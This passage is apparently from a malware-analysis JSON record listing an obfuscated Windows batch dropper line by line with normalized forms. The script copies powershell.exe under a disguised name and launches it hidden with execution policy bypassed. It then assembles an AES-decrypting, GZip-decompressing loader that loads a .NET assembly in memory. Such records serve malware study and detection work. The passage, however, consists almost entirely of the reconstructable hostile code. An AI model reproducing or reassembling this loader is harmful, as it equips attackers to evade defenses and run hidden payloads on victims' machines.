\\\"jPiqZkTOYC=o){$\\\"\"}, {\"Command\": \"%CuYg%\\\"kEDvfGsftM%KWxq%o($e\\\"\", \"Normalized\": \"set \\\"kEDvfGsftM=o($e\\\"\"}, {\"Command\": \"%CuYg%\\\"DloeezSPDD%KWxq%nver\\\"\", \"Normalized\": \"set \\\"DloeezSPDD=nver\\\"\"}, {\"Command\": \"%CuYg%\\\"hZhqrbwjuw%KWxq%EcC.\\\"\", \"Normalized\": \"set \\\"hZhqrbwjuw=EcC.\\\"\"}, {\"Command\": \"%CuYg%\\\"OCoqkbuCvf%KWxq%$iXJ\\\"\", \"Normalized\": \"set \\\"OCoqkbuCvf=$iXJ\\\"\"}, {\"Command\": \"%CuYg%\\\"yKhkkoaPLt%KWxq%iXJI\\\"\", \"Normalized\": \"set \\\"yKhkkoaPLt=iXJI\\\"\"}, {\"Command\": \"%CuYg%\\\"EjCgKDfBav%KWxq%n.As\\\"\", \"Normalized\": \"set \\\"EjCgKDfBav=n.As\\\"\"}, {\"Command\": \"%CuYg%\\\"VmevwsjypK%KWxq%xbkw\\\"\", \"Normalized\": \"set \\\"VmevwsjypK=xbkw\\\"\"}, {\"Command\": \"%CuYg%\\\"zbeBEcMaHg%KWxq%d[0]\\\"\", \"Normalized\": \"set \\\"zbeBEcMaHg=d[0]\\\"\"}, {\"Command\": \"%CuYg%\\\"hkbSDrBUyE%KWxq%mpre\\\"\", \"Normalized\": \"set \\\"hkbSDrBUyE=mpre\\\"\"}, {\"Command\": \"%CuYg%\\\"eOCHWxBEEF%KWxq%iXJI\\\"\", \"Normalized\": \"set \\\"eOCHWxBEEF=iXJI\\\"\"}, {\"Command\": \"%CuYg%\\\"jOJYiHiMaP%KWxq%pVA \\\"\", \"Normalized\": \"set \\\"jOJYiHiMaP=pVA \\\"\"}, {\"Command\": \"%CuYg%\\\"uPboHFkZhf%KWxq%.IO.\\\"\", \"Normalized\": \"set \\\"uPboHFkZhf=.IO.\\\"\"}, {\"Command\": \"%CuYg%\\\"rgGVyeMfUI%KWxq% '')\\\"\", \"Normalized\": \"set \\\"rgGVyeMfUI= '')\\\"\"}, {\"Command\": \"%CuYg%\\\"kerdOYGyEy%KWxq%em.C\\\"\", \"Normalized\": \"set \\\"kerdOYGyEy=em.C\\\"\"}, {\"Command\": \"%CuYg%\\\"pbjIMoEeHU%KWxq%rF'[\\\"\", \"Normalized\": \"set \\\"pbjIMoEeHU=rF'[\\\"\"}, {\"Command\": \"%CuYg%\\\"tVUgTIRgVc%KWxq%= $c\\\"\", \"Normalized\": \"set \\\"tVUgTIRgVc== $c\\\"\"}, {\"Command\": \"%CuYg%\\\"GpxhghKzri%KWxq%stem\\\"\", \"Normalized\": \"set \\\"GpxhghKzri=stem\\\"\"}, {\"Command\": \"%CuYg%\\\"BxyInuZyue%KWxq%]] (\\\"\", \"Normalized\": \"set \\\"BxyInuZyue=]] (\\\"\"}, {\"Command\": \"%CuYg%\\\"QKIpkNFaYl%KWxq%knKV\\\"\", \"Normalized\": \"set \\\"QKIpkNFaYl=knKV\\\"\"}, {\"Command\": \"%CuYg%\\\"PzsbrKfqot%KWxq%w-Ob\\\"\", \"Normalized\": \"set \\\"PzsbrKfqot=w-Ob\\\"\"}, {\"Command\": \"%CuYg%\\\"OBayzYSZja%KWxq%New-\\\"\", \"Normalized\": \"set \\\"OBayzYSZja=New-\\\"\"}, {\"Command\": \"%CuYg%\\\"NRaEzBwAGM%KWxq%XTgj\\\"\", \"Normalized\": \"set \\\"NRaEzBwAGM=XTgj\\\"\"}, {\"Command\": \"%CuYg%\\\"hNVTHeyqvd%KWxq%L.Cr\\\"\", \"Normalized\": \"set \\\"hNVTHeyqvd=L.Cr\\\"\"}, {\"Command\": \"%CuYg%\\\"XPjexZLyxd%KWxq%..-1\\\"\", \"Normalized\": \"set \\\"XPjexZLyxd=..-1\\\"\"}, {\"Command\": \"%CuYg%\\\"QqkNyVJNCQ%KWxq%tem.\\\"\", \"Normalized\": \"set \\\"QqkNyVJNCQ=tem.\\\"\"}, {\"Command\": \"%CuYg%\\\"FTuXThQoXh%KWxq%in '\\\"\", \"Normalized\": \"set \\\"FTuXThQoXh=in '\\\"\"}, {\"Command\": \"%CuYg%\\\"sctdkDksKr%KWxq%.-16\\\"\", \"Normalized\": \"set \\\"sctdkDksKr=.-16\\\"\"}, {\"Command\": \"%CuYg%\\\"bGOLpfDsPR%KWxq%urit\\\"\", \"Normalized\": \"set \\\"bGOLpfDsPR=urit\\\"\"}, {\"Command\": \"%CuYg%\\\"DAKKRhWUKT%KWxq%ss);\\\"\", \"Normalized\": \"set \\\"DAKKRhWUKT=ss);\\\"\"}, {\"Command\": \"%CuYg%\\\"gErzezjFdP%KWxq%FNAo\\\"\", \"Normalized\": \"set \\\"gErzezjFdP=FNAo\\\"\"}, {\"Command\": \"%CuYg%\\\"OqPCQSUtoR%KWxq%y = \\\"\", \"Normalized\": \"set \\\"OqPCQSUtoR=y = \\\"\"}, {\"Command\": \"%CuYg%\\\"RMiopvhpPa%KWxq%File\\\"\", \"Normalized\": \"set \\\"RMiopvhpPa=File\\\"\"}, {\"Command\": \"%CuYg%\\\"qWepMcVmxx%KWxq%gnir\\\"\", \"Normalized\": \"set \\\"qWepMcVmxx=gnir\\\"\"}, {\"Command\": \"%CuYg%\\\"AnHpRhwdky%KWxq%S7;$\\\"\", \"Normalized\": \"set \\\"AnHpRhwdky=S7;$\\\"\"}, {\"Command\": \"%CuYg%\\\"GWLRMtDBPJ%KWxq%k; }\\\"\", \"Normalized\": \"set \\\"GWLRMtDBPJ=k; }\\\"\"}, {\"Command\": \"%CuYg%\\\"lfDQIhpRNh%KWxq%yste\\\"\", \"Normalized\": \"set \\\"lfDQIhpRNh=yste\\\"\"}, {\"Command\": \"%CuYg%\\\"jdsVbiYTVx%KWxq%)('6\\\"\", \"Normalized\": \"set \\\"jdsVbiYTVx=)('6\\\"\"}, {\"Command\": \"%CuYg%\\\"xRAaDtnJUv%KWxq%$ret\\\"\", \"Normalized\": \"set \\\"xRAaDtnJUv=$ret\\\"\"}, {\"Command\": \"%CuYg%\\\"cyQAbRrNAA%KWxq%mFNA\\\"\", \"Normalized\": \"set \\\"cyQAbRrNAA=mFNA\\\"\"}, {\"Command\": \"%CuYg%\\\"lNiImCmnFg%KWxq%FNAo\\\"\", \"Normalized\": \"set \\\"lNiImCmnFg=FNAo\\\"\"}, {\"Command\": \"%CuYg%\\\"ZndraMngRT%KWxq%ly]:\\\"\", \"Normalized\": \"set \\\"ZndraMngRT=ly]:\\\"\"}, {\"Command\": \"%CuYg%\\\"LxiuJZQePD%KWxq%);}f\\\"\", \"Normalized\": \"set \\\"LxiuJZQePD=);}f\\\"\"}, {\"Command\": \"%CuYg%\\\"QtUghqzKzW%KWxq%urit\\\"\", \"Normalized\": \"set \\\"QtUghqzKzW=urit\\\"\"}, {\"Command\": \"%CuYg%\\\"aBmVnzULHT%KWxq%Star\\\"\", \"Normalized\": \"set \\\"aBmVnzULHT=Star\\\"\"}, {\"Command\": \"%CuYg%\\\"PSGObflUoQ%KWxq%Syst\\\"\", \"Normalized\": \"set \\\"PSGObflUoQ=Syst\\\"\"}, {\"Command\": \"%CuYg%\\\"ufCWrlvluF%KWxq%ewLi\\\"\", \"Normalized\": \"set \\\"ufCWrlvluF=ewLi\\\"\"}, {\"Command [trunc]\": \"%evHTLasVFk%%zCgJWixVBh%%atqNdyhGqZ%%PqcXFSpvJl%%rxXnSEPTyQ%%IPvppKfUQn%%TLFGuiAjed%%SblpPDvcUy%%Ioi\", \"Normalized [trunc]\": \"\\\"script.bat.exe\\\" -noprofile -w hidden -ep bypass -c function Fbeoh($mFNAo){$iXJIL = New-Object Syste\"}, {\"Command\": \"%CuYg%\\\"zCgJWixVBh%KWxq% /b\\\"\", \"Normalized\": \"set \\\"zCgJWixVBh= /b\\\"\"}, {\"Command\": \"%CuYg%\\\"evHTLasVFk%KWxq%exit\\\"\", \"Normalized\": \"set \\\"evHTLasVFk=exit\\\"\"}, {\"Command\": \"%evHTLasVFk%%zCgJWixVBh%\", \"Normalized\": \"exit /b\"}]",
+        "body": [
+          {
+            "Command": "%CuYg%\"KWxq==\"",
+            "Normalized": "set \"KWxq==\""
+          },
+          {
+            "Command": "%CuYg%\"evHTLasVFk%KWxq%copy\"",
+            "Normalized": "set \"evHTLasVFk=copy\""
+          },
+          {
+            "Command": "%CuYg%\"MejltbzOCJ%KWxq%rshe\"",
+            "Normalized": "set \"MejltbzOCJ=rshe\""
+          },
+          {
+            "Command": "%CuYg%\"NvEwsFRrTJ%KWxq%rShe\"",
+            "Normalized": "set \"NvEwsFRrTJ=rShe\""
+          },
+          {
+            "Command": "%CuYg%\"TLFGuiAjed%KWxq%\\Win\"",
+            "Normalized": "set \"TLFGuiAjed=\\Win\""
+          },
+          {
+            "Command": "%CuYg%\"rxXnSEPTyQ%KWxq%Syst\"",
+            "Normalized": "set \"rxXnSEPTyQ=Syst\""
+          },
+          {
+            "Command": "%CuYg%\"PqcXFSpvJl%KWxq%ows\\\"",
+            "Normalized": "set \"PqcXFSpvJl=ows\\\""
+          },
+          {
+            "Command": "%CuYg%\"zCgJWixVBh%KWxq% C:\\\"",
+            "Normalized": "set \"zCgJWixVBh= C:\\\""
+          },
+          {
+            "Command": "%CuYg%\"wPmWFLwmSO%KWxq%ll.e\"",
+            "Normalized": "set \"wPmWFLwmSO=ll.e\""
+          },
+          {
+            "Command": "%CuYg%\"jPiqZkTOYC%KWxq%y \"%~0.\"",
+            "Normalized": "set \"jPiqZkTOYC=y \"script.bat.\""
+          },
+          {
+            "Command": "%CuYg%\"cMazvqfEdA%KWxq%xe /\"",
+            "Normalized": "set \"cMazvqfEdA=xe /\""
+          },
+          {
+            "Command": "%CuYg%\"SblpPDvcUy%KWxq%dows\"",
+            "Normalized": "set \"SblpPDvcUy=dows\""
+          },
+          {
+            "Command": "%CuYg%\"nOAjqwxOWj%KWxq%powe\"",
+            "Normalized": "set \"nOAjqwxOWj=powe\""
+          },
+          {
+            "Command": "%CuYg%\"IoiAqaVMIU%KWxq%Powe\"",
+            "Normalized": "set \"IoiAqaVMIU=Powe\""
+          },
+          {
+            "Command": "%CuYg%\"ocZsEEDeqt%KWxq%1.0\\\"",
+            "Normalized": "set \"ocZsEEDeqt=1.0\\\""
+          },
+          {
+            "Command": "%CuYg%\"eGOuXHDfAL%KWxq%ll\\v\"",
+            "Normalized": "set \"eGOuXHDfAL=ll\\v\""
+          },
+          {
+            "Command": "%CuYg%\"eOCHWxBEEF%KWxq%exe\"\"",
+            "Normalized": "set \"eOCHWxBEEF=exe\"\""
+          },
+          {
+            "Command": "%CuYg%\"atqNdyhGqZ%KWxq%Wind\"",
+            "Normalized": "set \"atqNdyhGqZ=Wind\""
+          },
+          {
+            "Command": "%CuYg%\"IPvppKfUQn%KWxq%em32\"",
+            "Normalized": "set \"IPvppKfUQn=em32\""
+          },
+          {
+            "Command [trunc]": "%evHTLasVFk%%zCgJWixVBh%%atqNdyhGqZ%%PqcXFSpvJl%%rxXnSEPTyQ%%IPvppKfUQn%%TLFGuiAjed%%SblpPDvcUy%%Ioi",
+            "Normalized": "copy C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe /y \"script.bat.exe\""
+          },
+          {
+            "Command": "%CuYg%\"evHTLasVFk%KWxq%cls\"",
+            "Normalized": "set \"evHTLasVFk=cls\""
+          },
+          {
+            "Command": "%evHTLasVFk%",
+            "Normalized": "cls"
+          },
+          {
+            "Command": "%CuYg%\"evHTLasVFk%KWxq%cd \"%~dp0\"\"",
+            "Normalized": "set \"evHTLasVFk=cd \"C:\\Users\\al\\Downloads\\\"\""
+          },
+          {
+            "Command": "%evHTLasVFk%",
+            "Normalized": "cd \"C:\\Users\\al\\Downloads\\\""
+          },
+          {
+            "Command": "%CuYg%\"KFhiTtTefn%KWxq%bcsc\"",
+            "Normalized": "set \"KFhiTtTefn=bcsc\""
+          },
+          {
+            "Command": "%CuYg%\"OLhRouUmCA%KWxq%yste\"",
+            "Normalized": "set \"OLhRouUmCA=yste\""
+          },
+          {
+            "Command": "%CuYg%\"TuALKbnWbr%KWxq%daeR\"",
+            "Normalized": "set \"TuALKbnWbr=daeR\""
+          },
+          {
+            "Command": "%CuYg%\"KorzVUcxpH%KWxq%fzpV\"",
+            "Normalized": "set \"KorzVUcxpH=fzpV\""
+          },
+          {
+            "Command": "%CuYg%\"iMzGCsFzmB%KWxq%  $W\"",
+            "Normalized": "set \"iMzGCsFzmB=  $W\""
+          },
+          {
+            "Command": "%CuYg%\"NQtRMbKKNU%KWxq%ompr\"",
+            "Normalized": "set \"NQtRMbKKNU=ompr\""
+          },
+          {
+            "Command": "%CuYg%\"IzwhrUNQvp%KWxq%tj9E\"",
+            "Normalized": "set \"IzwhrUNQvp=tj9E\""
+          },
+          {
+            "Command": "%CuYg%\"ToSfqNpbOP%KWxq%= Ne\"",
+            "Normalized": "set \"ToSfqNpbOP== Ne\""
+          },
+          {
+            "Command": "%CuYg%\"MRklRxGPSt%KWxq%vert\"",
+            "Normalized": "set \"MRklRxGPSt=vert\""
+          },
+          {
+            "Command": "%CuYg%\"JAQhUMIKUc%KWxq%eam(\"",
+            "Normalized": "set \"JAQhUMIKUc=eam(\""
+          },
+          {
+            "Command": "%CuYg%\"AqUTOKTzkr%KWxq%, $u\"",
+            "Normalized": "set \"AqUTOKTzkr=, $u\""
+          },
+          {
+            "Command": "%CuYg%\"eBYxfCljzM%KWxq%n.Co\"",
+            "Normalized": "set \"eBYxfCljzM=n.Co\""
+          },
+          {
+            "Command": "%CuYg%\"VhYAnFQNNA%KWxq%-16]\"",
+            "Normalized": "set \"VhYAnFQNNA=-16]\""
+          },
+          {
+            "Command": "%CuYg%\"cMazvqfEdA%KWxq%mFNA\"",
+            "Normalized": "set \"cMazvqfEdA=mFNA\""
+          },
+          {
+            "Command": "%CuYg%\"PgBBDfaZmz%KWxq%GzhX\"",
+            "Normalized": "set \"PgBBDfaZmz=GzhX\""
+          },
+          {
+            "Command": "%CuYg%\"MejltbzOCJ%KWxq% Fbe\"",
+            "Normalized": "set \"MejltbzOCJ= Fbe\""
+          },
+          {
+            "Command": "%CuYg%\"uOLDbMOzLS%KWxq%LI =\"",
+            "Normalized": "set \"uOLDbMOzLS=LI =\""
+          },
+          {
+            "Command": "%CuYg%\"CIbOVoBykK%KWxq%');$\"",
+            "Normalized": "set \"CIbOVoBykK=');$\""
+          },
+          {
+            "Command": "%CuYg%\"OVWXlExqUt%KWxq%tslL\"",
+            "Normalized": "set \"OVWXlExqUt=tslL\""
+          },
+          {
+            "Command": "%CuYg%\"gARUeyUZdZ%KWxq%se()\"",
+            "Normalized": "set \"gARUeyUZdZ=se()\""
+          },
+          {
+            "Command": "%CuYg%\"xCNFaFctSS%KWxq%[Env\"",
+            "Normalized": "set \"xCNFaFctSS=[Env\""
+          },
+          {
+            "Command": "%CuYg%\"IhyuaHGOAO%KWxq% [Sy\"",
+            "Normalized": "set \"IhyuaHGOAO= [Sy\""
+          },
+          {
+            "Command": "%CuYg%\"fnEhcmdYIF%KWxq%Y = \"",
+            "Normalized": "set \"fnEhcmdYIF=Y = \""
+          },
+          {
+            "Command": "%CuYg%\"tOOHnwFVSB%KWxq% Sys\"",
+            "Normalized": "set \"tOOHnwFVSB= Sys\""
+          },
+          {
+            "Command": "%CuYg%\"DiuWzpTqag%KWxq%ToAr\"",
+            "Normalized": "set \"DiuWzpTqag=ToAr\""
+          },
+          {
+            "Command": "%CuYg%\"JIIjCjMAXx%KWxq%ray(\"",
+            "Normalized": "set \"JIIjCjMAXx=ray(\""
+          },
+          {
+            "Command": "%CuYg%\"fCIgYFrYEd%KWxq%de]:\"",
+            "Normalized": "set \"fCIgYFrYEd=de]:\""
+          },
+          {
+            "Command": "%CuYg%\"eNAlZmKoBq%KWxq%Decr\"",
+            "Normalized": "set \"eNAlZmKoBq=Decr\""
+          },
+          {
+            "Command": "%CuYg%\"KAPZcPfmqI%KWxq%rtS4\"",
+            "Normalized": "set \"KAPZcPfmqI=rtS4\""
+          },
+          {
+            "Command": "%CuYg%\"atoaBcGwDP%KWxq%Wzhe\"",
+            "Normalized": "set \"atoaBcGwDP=Wzhe\""
+          },
+          {
+            "Command": "%CuYg%\"tpKxvYUwEL%KWxq%[]]$\"",
+            "Normalized": "set \"tpKxvYUwEL=[]]$\""
+          },
+          {
+            "Command": "%CuYg%\"wPmWFLwmSO%KWxq%oh($\"",
+            "Normalized": "set \"wPmWFLwmSO=oh($\""
+          },
+          {
+            "Command": "%CuYg%\"onPKItoWSm%KWxq%F'[-\"",
+            "Normalized": "set \"onPKItoWSm=F'[-\""
+          },
+          {
+            "Command": "%CuYg%\"OsraDVDLeC%KWxq%Syst\"",
+            "Normalized": "set \"OsraDVDLeC=Syst\""
+          },
+          {
+            "Command": "%CuYg%\"nASJxCScAq%KWxq%ngMo\"",
+            "Normalized": "set \"nASJxCScAq=ngMo\""
+          },
+          {
+            "Command": "%CuYg%\"MolEQFEDdv%KWxq%c $n\"",
+            "Normalized": "set \"MolEQFEDdv=c $n\""
+          },
+          {
+            "Command": "%CuYg%\"nOAjqwxOWj%KWxq%tion\"",
+            "Normalized": "set \"nOAjqwxOWj=tion\""
+          },
+          {
+            "Command": "%CuYg%\"MxzYohHXZJ%KWxq%h ([\"",
+            "Normalized": "set \"MxzYohHXZJ=h ([\""
+          },
+          {
+            "Command": "%CuYg%\"RFCthfrYDh%KWxq%{$fz\"",
+            "Normalized": "set \"RFCthfrYDh={$fz\""
+          },
+          {
+            "Command": "%CuYg%\"qtDufrglgY%KWxq%[-1.\"",
+            "Normalized": "set \"qtDufrglgY=[-1.\""
+          },
+          {
+            "Command": "%CuYg%\"LCYHPKzbLB%KWxq%;Gzh\"",
+            "Normalized": "set \"LCYHPKzbLB=;Gzh\""
+          },
+          {
+            "Command": "%CuYg%\"ffFVVznKpA%KWxq%ach \"",
+            "Normalized": "set \"ffFVVznKpA=ach \""
+          },
+          {
+            "Command": "%CuYg%\"RAOfBcDoSK%KWxq%Xy $\"",
+            "Normalized": "set \"RAOfBcDoSK=Xy $\""
+          },
+          {
+            "Command": "%CuYg%\"skZhaoDTik%KWxq%e]::\"",
+            "Normalized": "set \"skZhaoDTik=e]::\""
+          },
+          {
+            "Command": "%CuYg%\"TIWMILLZPJ%KWxq%th('\"",
+            "Normalized": "set \"TIWMILLZPJ=th('\""
+          },
+          {
+            "Command": "%CuYg%\"GQjMJmNRvl%KWxq%ispo\"",
+            "Normalized": "set \"GQjMJmNRvl=ispo\""
+          },
+          {
+            "Command": "%CuYg%\"AaDtnoGIFd%KWxq%ssio\"",
+            "Normalized": "set \"AaDtnoGIFd=ssio\""
+          },
+          {
+            "Command": "%CuYg%\"blDGmyCaXe%KWxq%:('d\"",
+            "Normalized": "set \"blDGmyCaXe=:('d\""
+          },
+          {
+            "Command": "%CuYg%\"CgJNeBHzYp%KWxq%bkw.\"",
+            "Normalized": "set \"CgJNeBHzYp=bkw.\""
+          },
+          {
+            "Command": "%CuYg%\"EOqrgPYKgK%KWxq%StqX\"",
+            "Normalized": "set \"EOqrgPYKgK=StqX\""
+          },
+          {
+            "Command": "%CuYg%\"HZbOFHUmqG%KWxq%stem\"",
+            "Normalized": "set \"HZbOFHUmqG=stem\""
+          },
+          {
+            "Command": "%CuYg%\"EfkSaASwJI%KWxq%JIL.\"",
+            "Normalized": "set \"EfkSaASwJI=JIL.\""
+          },
+          {
+            "Command": "%CuYg%\"PBQFzEKslK%KWxq%)));\"",
+            "Normalized": "set \"PBQFzEKslK=)));\""
+          },
+          {
+            "Command": "%CuYg%\"xFAZQSxCWO%KWxq%e]::\"",
+            "Normalized": "set \"xFAZQSxCWO=e]::\""
+          },
+          {
+            "Command": "%CuYg%\"XMvoEjSTYL%KWxq%e();\"",
+            "Normalized": "set \"XMvoEjSTYL=e();\""
+          },
+          {
+            "Command": "%CuYg%\"saHGAsRDbU%KWxq%BpQ \"",
+            "Normalized": "set \"saHGAsRDbU=BpQ \""
+          },
+          {
+            "Command": "%CuYg%\"nAPnHVrwnI%KWxq%Q=='\"",
+            "Normalized": "set \"nAPnHVrwnI=Q=='\""
+          },
+          {
+            "Command": "%CuYg%\"PqcXFSpvJl%KWxq%prof\"",
+            "Normalized": "set \"PqcXFSpvJl=prof\""
+          },
+          {
+            "Command": "%CuYg%\"hDlSfqIlxz%KWxq%md[1\"",
+            "Normalized": "set \"hDlSfqIlxz=md[1\""
+          },
+          {
+            "Command": "%CuYg%\"MlvLKWcNOr%KWxq%utZv\"",
+            "Normalized": "set \"MlvLKWcNOr=utZv\""
+          },
+          {
+            "Command": "%CuYg%\"YBpmHyniMy%KWxq%on c\"",
+            "Normalized": "set \"YBpmHyniMy=on c\""
+          },
+          {
+            "Command": "%CuYg%\"CwGfNEeRDg%KWxq%c (F\"",
+            "Normalized": "set \"CwGfNEeRDg=c (F\""
+          },
+          {
+            "Command": "%CuYg%\"iNGirhpUFJ%KWxq%Memo\"",
+            "Normalized": "set \"iNGirhpUFJ=Memo\""
+          },
+          {
+            "Command": "%CuYg%\"TPluQNyJMl%KWxq%brea\"",
+            "Normalized": "set \"TPluQNyJMl=brea\""
+          },
+          {
+            "Command": "%CuYg%\"QUNIxHUhTO%KWxq%ne);\"",
+            "Normalized": "set \"QUNIxHUhTO=ne);\""
+          },
+          {
+            "Command": "%CuYg%\"hvGfJzFvTX%KWxq%.Sec\"",
+            "Normalized": "set \"hvGfJzFvTX=.Sec\""
+          },
+          {
+            "Command": "%CuYg%\"qgqWfSinGK%KWxq%]::N\"",
+            "Normalized": "set \"qgqWfSinGK=]::N\""
+          },
+          {
+            "Command": "%CuYg%\"wYnLgIYcpq%KWxq%1] -\"",
+            "Normalized": "set \"wYnLgIYcpq=1] -\""
+          },
+          {
+            "Command": "%CuYg%\"TeVUbqzwtx%KWxq%]::(\"",
+            "Normalized": "set \"TeVUbqzwtx=]::(\""
+          },
+          {
+            "Command": "%CuYg%\"bZaCizBSiv%KWxq%xbkw\"",
+            "Normalized": "set \"bZaCizBSiv=xbkw\""
+          },
+          {
+            "Command": "%CuYg%\"nDQDczelLa%KWxq%de =\"",
+            "Normalized": "set \"nDQDczelLa=de =\""
+          },
+          {
+            "Command": "%CuYg%\"vGbqITHGpQ%KWxq%tem.\"",
+            "Normalized": "set \"vGbqITHGpQ=tem.\""
+          },
+          {
+            "Command": "%CuYg%\"ujcyREZKgC%KWxq%mijf\"",
+            "Normalized": "set \"ujcyREZKgC=mijf\""
+          },
+          {
+            "Command": "%CuYg%\"joOgFaomrJ%KWxq%[Sys\"",
+            "Normalized": "set \"joOgFaomrJ=[Sys\""
+          },
+          {
+            "Command": "%CuYg%\"dnZKuTJdXZ%KWxq%zheY\"",
+            "Normalized": "set \"dnZKuTJdXZ=zheY\""
+          },
+          {
+            "Command": "%CuYg%\"PBFDYqdwLA%KWxq%;$iX\"",
+            "Normalized": "set \"PBFDYqdwLA=;$iX\""
+          },
+          {
+            "Command": "%CuYg%\"cyFCmQMRxa%KWxq%]::(\"",
+            "Normalized": "set \"cyFCmQMRxa=]::(\""
+          },
+          {
+            "Command": "%CuYg%\"zDcsPzxQgU%KWxq%m($f\"",
+            "Normalized": "set \"zDcsPzxQgU=m($f\""
+          },
+          {
+            "Command": "%CuYg%\"yImlKoDuZf%KWxq%grap\"",
+            "Normalized": "set \"yImlKoDuZf=grap\""
+          },
+          {
+            "Command": "%CuYg%\"tGATjgbFdZ%KWxq%ert]\"",
+            "Normalized": "set \"tGATjgbFdZ=ert]\""
+          },
+          {
+            "Command": "%CuYg%\"uPLJZRcqKI%KWxq%L.Ke\"",
+            "Normalized": "set \"uPLJZRcqKI=L.Ke\""
+          },
+          {
+            "Command": "%CuYg%\"hxdJgDtyUh%KWxq%mpre\"",
+            "Normalized": "set \"hxdJgDtyUh=mpre\""
+          },
+          {
+            "Command": "%CuYg%\"XMgFbeVRQo%KWxq%Spli\"",
+            "Normalized": "set \"XMgFbeVRQo=Spli\""
+          },
+          {
+            "Command": "%CuYg%\"yQqgtOKUCw%KWxq%fzum\"",
+            "Normalized": "set \"yQqgtOKUCw=fzum\""
+          },
+          {
+            "Command": "%CuYg%\"kmRUNdlwoK%KWxq% '')\"",
+            "Normalized": "set \"kmRUNdlwoK= '')\""
+          },
+          {
+            "Command": "%CuYg%\"sKZmnYwsPK%KWxq%var \"",
+            "Normalized": "set \"sKZmnYwsPK=var \""
+          },
+          {
+            "Command": "%CuYg%\"AqVVbXxnDl%KWxq%UUzN\"",
+            "Normalized": "set \"AqVVbXxnDl=UUzN\""
+          },
+          {
+            "Command": "%CuYg%\"UeGEtxdZSP%KWxq%ypto\"",
+            "Normalized": "set \"UeGEtxdZSP=ypto\""
+          },
+          {
+            "Command": "%CuYg%\"zCgJWixVBh%KWxq%exe\"\"",
+            "Normalized": "set \"zCgJWixVBh=exe\"\""
+          },
+          {
+            "Command": "%CuYg%\"LyhwAdTOlf%KWxq%ncti\"",
+            "Normalized": "set \"LyhwAdTOlf=ncti\""
+          },
+          {
+            "Command": "%CuYg%\"BpntAnTBoB%KWxq%rMod\"",
+            "Normalized": "set \"BpntAnTBoB=rMod\""
+          },
+          {
+            "Command": "%CuYg%\"VvWxZiUGJF%KWxq%gGVH\"",
+            "Normalized": "set \"VvWxZiUGJF=gGVH\""
+          },
+          {
+            "Command": "%CuYg%\"UOXvXISuQx%KWxq%o);$\"",
+            "Normalized": "set \"UOXvXISuQx=o);$\""
+          },
+          {
+            "Command": "%CuYg%\"ofpWOkNolu%KWxq%16] \"",
+            "Normalized": "set \"ofpWOkNolu=16] \""
+          },
+          {
+            "Command": "%CuYg%\"dcMEyyMALh%KWxq%y.Cr\"",
+            "Normalized": "set \"dcMEyyMALh=y.Cr\""
+          },
+          {
+            "Command": "%CuYg%\"gAVCeNjcRT%KWxq%($gE\"",
+            "Normalized": "set \"gAVCeNjcRT=($gE\""
+          },
+          {
+            "Command": "%CuYg%\"kQjYaqquLh%KWxq%bstr\"",
+            "Normalized": "set \"kQjYaqquLh=bstr\""
+          },
+          {
+            "Command": "%CuYg%\"NFBDRELKjY%KWxq%se()\"",
+            "Normalized": "set \"NFBDRELKjY=se()\""
+          },
+          {
+            "Command": "%CuYg%\"dsJSmRQNVP%KWxq%sc (\"",
+            "Normalized": "set \"dsJSmRQNVP=sc (\""
+          },
+          {
+            "Command": "%CuYg%\"nZvZPCokpW%KWxq%y $U\"",
+            "Normalized": "set \"nZvZPCokpW=y $U\""
+          },
+          {
+            "Command": "%CuYg%\"zPAxpoHTNb%KWxq%y($m\"",
+            "Normalized": "set \"zPAxpoHTNb=y($m\""
+          },
+          {
+            "Command": "%CuYg%\"qUMWvTjQGV%KWxq%('gn\"",
+            "Normalized": "set \"qUMWvTjQGV=('gn\""
+          },
+          {
+            "Command": "%CuYg%\"AueOmBfLQU%KWxq%ew-O\"",
+            "Normalized": "set \"AueOmBfLQU=ew-O\""
+          },
+          {
+            "Command": "%CuYg%\"kOTNkGtoIo%KWxq%m.Co\"",
+            "Normalized": "set \"kOTNkGtoIo=m.Co\""
+          },
+          {
+            "Command": "%CuYg%\"HlKHYIysIk%KWxq%aBmo\"",
+            "Normalized": "set \"HlKHYIysIk=aBmo\""
+          },
+          {
+            "Command": "%CuYg%\"kUkLvGkPtL%KWxq%ntry\"",
+            "Normalized": "set \"kUkLvGkPtL=ntry\""
+          },
+          {
+            "Command": "%CuYg%\"gbYynNpojg%KWxq%rySt\"",
+            "Normalized": "set \"gbYynNpojg=rySt\""
+          },
+          {
+            "Command": "%CuYg%\"envboRXubR%KWxq%oke(\"",
+            "Normalized": "set \"envboRXubR=oke(\""
+          },
+          {
+            "Command": "%CuYg%\"IkMYWrwteh%KWxq%nalB\"",
+            "Normalized": "set \"IkMYWrwteh=nalB\""
+          },
+          {
+            "Command": "%CuYg%\"atekjCvdNs%KWxq%t Sy\"",
+            "Normalized": "set \"atekjCvdNs=t Sy\""
+          },
+          {
+            "Command": "%CuYg%\"WGpKtCdmgE%KWxq%eate\"",
+            "Normalized": "set \"WGpKtCdmgE=eate\""
+          },
+          {
+            "Command": "%CuYg%\"cjuOhQlzgf%KWxq%[str\"",
+            "Normalized": "set \"cjuOhQlzgf=[str\""
+          },
+          {
+            "Command": "%CuYg%\"MIuEHGHIEE%KWxq%opyT\"",
+            "Normalized": "set \"MIuEHGHIEE=opyT\""
+          },
+          {
+            "Command": "%CuYg%\"zkWuMLvWRI%KWxq%, [I\"",
+            "Normalized": "set \"zkWuMLvWRI=, [I\""
+          },
+          {
+            "Command": "%CuYg%\"VDcTgbJqLM%KWxq%stem\"",
+            "Normalized": "set \"VDcTgbJqLM=stem\""
+          },
+          {
+            "Command": "%CuYg%\"otdYaXQYEw%KWxq%slL.\"",
+            "Normalized": "set \"otdYaXQYEw=slL.\""
+          },
+          {
+            "Command": "%CuYg%\"ViyNXAeGEH%KWxq%iXJI\"",
+            "Normalized": "set \"ViyNXAeGEH=iXJI\""
+          },
+          {
+            "Command": "%CuYg%\"eGllXgojwo%KWxq%ing(\"",
+            "Normalized": "set \"eGllXgojwo=ing(\""
+          },
+          {
+            "Command": "%CuYg%\"egsBJiUFus%KWxq%Conv\"",
+            "Normalized": "set \"egsBJiUFus=Conv\""
+          },
+          {
+            "Command": "%CuYg%\"IVcgoIgwkq%KWxq%:('g\"",
+            "Normalized": "set \"IVcgoIgwkq=:('g\""
+          },
+          {
+            "Command": "%CuYg%\"MtUmESmgMg%KWxq%rmFi\"",
+            "Normalized": "set \"MtUmESmgMg=rmFi\""
+          },
+          {
+            "Command": "%CuYg%\"RYWZunfWqV%KWxq%-joi\"",
